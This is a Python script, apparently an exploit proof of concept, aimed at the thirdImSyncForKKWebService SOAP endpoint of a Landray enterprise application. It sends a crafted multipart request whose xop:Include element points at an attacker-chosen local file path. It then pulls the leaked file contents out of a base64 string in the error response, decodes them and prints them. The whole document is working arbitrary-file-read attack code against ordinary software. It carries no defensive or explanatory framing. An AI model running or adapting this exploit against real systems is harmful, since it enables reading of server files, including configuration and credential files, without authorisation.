import base64
import re
import sys

import chardet
import requests


file = sys.argv[2]
url_pre = sys.argv[1]

url = "{}/sys/webservice/thirdImSyncForKKWebService".format(url_pre)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; rv 11.0) like Gecko",
    "Accept": "*/*",
    "Accept-Encoding": "gzip,deflate",
    "Accept-Language": "zh-cn,en-us;q=0.7,en;q=0.3",
    "Content-Type": "multipart/related; boundary=----981a8b78836155a0811a",
    "SOAPAction": ""
}

payload = """------981a8b78836155a0811a
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
<web:getTodo>
<arg0>
<otherCond>1</otherCond>
<pageNo>1</pageNo>
<rowSize>1</rowSize>
<targets>1</targets>
<type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://{}"/></type>
</arg0>
</web:getTodo>
</soapenv:Body>
</soapenv:Envelope>
------981a8b78836155a0811a--""".format(file)

response = requests.post(url, headers=headers, data=payload)

# 使用正则提取 Base64 内容
match = re.search(r'Not a number: ([A-Za-z0-9+/=]+)', response.text)
if match:
    base64_str = match.group(1)
    try:
        # Base64 解码为二进制数据
        decoded_bytes = base64.b64decode(base64_str)

        # 自动检测编码
        detected_encoding = chardet.detect(decoded_bytes)['encoding']
        print("检测到的编码格式:", detected_encoding)

        if detected_encoding:
            decoded_text = decoded_bytes.decode(detected_encoding, errors='ignore')
            print("解码后的内容\n", decoded_text)
        else:
            print("无法识别编码，可能是二进制数据")
    except Exception as e:
        print("Base64 解码失败:", str(e))
else:
    print("未找到 Base64 编码的数据！")